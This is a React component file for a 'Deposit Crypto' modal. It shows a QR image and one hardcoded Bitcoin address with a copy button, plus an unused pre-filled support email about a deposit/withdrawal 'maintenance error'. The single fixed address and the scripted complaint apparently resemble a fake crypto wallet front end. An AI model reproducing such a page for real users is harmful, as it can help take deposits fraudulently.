// Pop.js
import React, { useState } from "react";
import { Modal, Button } from "react-bootstrap";
import styled from "styled-components";
import code from '../../Assets/code.jpg';

const StyledModalHeader = styled(Modal.Header)`
  background-color: #343a40;
  color: white;
`;

const StyledModalBody = styled(Modal.Body)`
  text-align: center;
  padding: 30px;
`;

const StyledModalFooter = styled(Modal.Footer)`
  border-top: none;
  justify-content: center;
`;

const BitcoinAddress = styled.p`
  font-weight: bold;
  font-size: 1.2em;
  margin: 20px 0;
  color: #333;
  word-break: break-all;
`;

const CopyButton = styled(Button)`
  margin-top: 10px;
  background-color: #f0f0f0; /* Slightly different default background */
  border: none;
  color: #333; /* Different text color */
  transition: background-color 0.3s ease;

  &:hover {
    background-color: #e0e0e0; /* Slightly darker on hover */
  }

  ${({ copied }) =>
    copied &&
    `
    background-color: #d4edda; /* Light green when copied */
    color: #155724; /* Dark green text */
  `}
`;

const Dep = ({ show, handleClose }) => {
  const [copied, setCopied] = useState(false);
  const bitcoinAddress = "1FS4D9wEopYPJW5UoyE1zGEL9U4pi1uLUP";

  const handleCopyClick = () => {
    navigator.clipboard.writeText(bitcoinAddress);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000); // Reset the copied state after 2 seconds
  };

  const handleEmailClick = () => {
    const email = "help@myprivatecryptowallet.com";
    const subject = `Wallet #4t345h65l9`;
    const body =
      `Hello MPCW Team,\n\n` +
      `I am facing a maintenance error with my deposit/withdrawals, can you please guide me through the process\n\n` +
      `\n\n` +
      `Thank you!\n\n` +
      `[Your Name]`;
    const mailtoLink = `mailto:${email}?subject=${encodeURIComponent(subject)}&body=${encodeURIComponent(body)}`;
    window.location.href = mailtoLink;
  };

  return (
    <Modal show={show} onHide={handleClose} centered>
      <StyledModalHeader closeButton>
        <Modal.Title>Deposit Crypto</Modal.Title>
      </StyledModalHeader>
      <StyledModalBody>
        <img src={code} alt="QR Code" />
        <p>
          <strong>Scan</strong> the code above, or copy the code below, to send
          the exact amount of Bitcoin to this address:
        </p>
        <BitcoinAddress>{bitcoinAddress}</BitcoinAddress>
        <CopyButton copied={copied} onClick={handleCopyClick}>
          {copied ? "Copied!" : "Copy to Clipboard"}
        </CopyButton>
      </StyledModalBody>
      <StyledModalFooter>Only send Bitcoin to this address</StyledModalFooter>
    </Modal>
  );
};

export default Dep;
